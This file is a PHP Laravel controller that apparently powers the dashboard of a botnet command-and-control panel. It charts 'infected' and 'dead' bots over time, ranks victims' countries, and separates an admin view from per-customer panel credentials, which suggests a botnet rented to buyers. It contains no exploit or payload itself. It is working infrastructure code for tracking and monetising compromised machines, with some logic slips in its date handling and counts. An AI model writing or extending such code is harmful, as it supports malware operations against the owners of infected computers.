<?php

namespace App\Http\Controllers;

use App\Bot;
use App\Connection;
use App\panelCredential;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class BoardController extends Controller
{

    /**
     * Constructor the board info
     *
     * @param null
     *
     * @return array
     */

    public static function boardMainData(){
        $data = array();
        $data['cards_info'] = BoardController::getCardsInfo();
        $data['charts_info'] = BoardController::getChartsInfo();
        $data['orders_info'] = OrdersController::getOrdersInfo();
        $data['countries_info'] = BoardController::getTopCountries();
        return $data;
    }

    /**
     * Get the cards info
     *
     * @param null
     *
     * @return array
     */

    private static function getCardsInfo(){

        $data = BotsController::getBotsStatus();
        return $data;
    }

    /**
     * Get the charts info
     *
     * @param null
     *
     * @return array
     */

    private static function getChartsInfo(){

        //Todo-> Verify is the user account is bigger than 8 hours if is not than return status 0;
        $user = Auth::user();
        $panelCredentials = $user->panelCredential()->first();
        //Initial date
        $initialDate = $user->created_at;
        //Now Date
        $nowDate = Carbon::now();
        //Get the interval
        $interval = $nowDate->diffInSeconds($initialDate);
        //Get if the chart is not less than 7 hours
        if($interval >= 25200){
            //Dive interval by 7 times
            $diveInterval = $interval/6;
            //Create a loop to run 6 time, //G
            $data = array();
            $data['label'] = [];
            $data['infected'] = [];
            $frameDate = '';
            for ($i = 0; $i <= 6; $i++) {
                //Define a data to pick information $frameDate //Define the time intervals for query
                if($i === 0){
                    $frameDate = clone $initialDate;
                }else{
                    $frameDate = $frameDate->addSeconds($diveInterval);
                }
                //Set the label Check if the interval is less than 1 day
                if($interval < 86400){
                    $data['label'][] = $frameDate->format('H:i'); //Hours:Minutes
                }else if($interval <= 604800){
                    $data['label'][] = $frameDate->format('dM H').'h'; //Day:Hour
                }else if($interval > 604800){
                    $data['label'][] = $frameDate->format('dM'); //Day
                }
                //Set the infected -> check the number of bots infected between the $diveInterval ->if Admin or not
                //Une week Sleep time
                $sleepTime = clone $frameDate;
                $sleepTime = $sleepTime->subDays(8);
                if($user->id === 1){
                    //Admin
                    $data['infected'][] = Bot::where('created_at', '<',$frameDate)->get()->count();
                    $data['dead'] [] = Connection::where('created_at', '<=',$sleepTime)->whereNotIn('bot_id',BoardController::getOnAndSleepBots(clone $frameDate))->groupBy('bot_id')->get()->count();
                }else{
                    //User
                    $data['infected'][] = $panelCredentials->bots()->where('created_at', '<',$frameDate)->get()->count();
                    $data['dead'] [] = $panelCredentials->bots()->first()->connection()->where('created_at', '<=',$sleepTime)->whereNotIn('bot_id',BoardController::getOnAndSleepBots(clone $frameDate))->get()->count();
                }
            }

            //$data['initialize'][] = BoardController::getOnAndSleepBots(clone $frameDate);
            $data['status'] = 1;
            return $data;
        }
        //If is lass tha 7 hours, status 0!
        $data['status'] = 0;
        return $data;
    }

    /**
     * Helper function to get all the sleep and online Bots
     *
     * @param $date
     * @return array
     */
    public static function getOnAndSleepBots($date){

        $user = Auth::user();
        $panelCredential = $user->panelCredential()->first();

        //Une week Sleep time
        $sleepTime = $date->subDays(8);

        //Check if Admin
        if($user->id === 1){
            $bots = Connection::where('created_at','>=',$sleepTime)->get()->pluck('bot_id');
        }else{
            $bots = $panelCredential->bots()->first()->connection()->where('created_at','>=',$sleepTime)->get()->pluck('bot_id');
        }

        return $bots;
    }

    /**
     * Get the top countries
     *
     * @param null
     *
     * @return array
     */

    private static function getTopCountries(){
        $data = array();
        //Get User
        $user = Auth::user();
        //Get panelCredential
        $panelCredential = $user->panelCredential()->first();
        //check if is admin
        if($user->id === 1){
            //Get the bots Countries
            $countries = Bot::groupBy('country')->get();
        }else{
            //Get the bots Countries
            $countries = $panelCredential->bots()->groupBy('country')->get();
        }
        //Check if it is bigger than 3!
        if($countries->count() >= 3){
            //Check the Countries
            $i=0;
            foreach ($countries as $country){
                $user->id === 1 ? $value = Bot::where('country',$country->country)->get()->count(): $value = $panelCredential->bots()->where('country',$country->country)->get()->count();
                $arrayNew[$i] = ['country'=>$country->country, 'value'=> $value];
                $i++;
            }
            //Organise the Array
            usort($arrayNew, function($a, $b){
                return $b['value'] - $a['value'];
            });
            //Short the array lime 3 rows
            for($i = 0;$i <=2; $i++){
                $data['labels'][] = $arrayNew[$i]['country'];
                $data['values'][] = $arrayNew[$i]['value'];
            }
            //Set Status 1;
            $data['status'] = 1;
            return $data;
        }
        //No Data to chart
        $data['status'] = 0;
        return $data;
    }


}

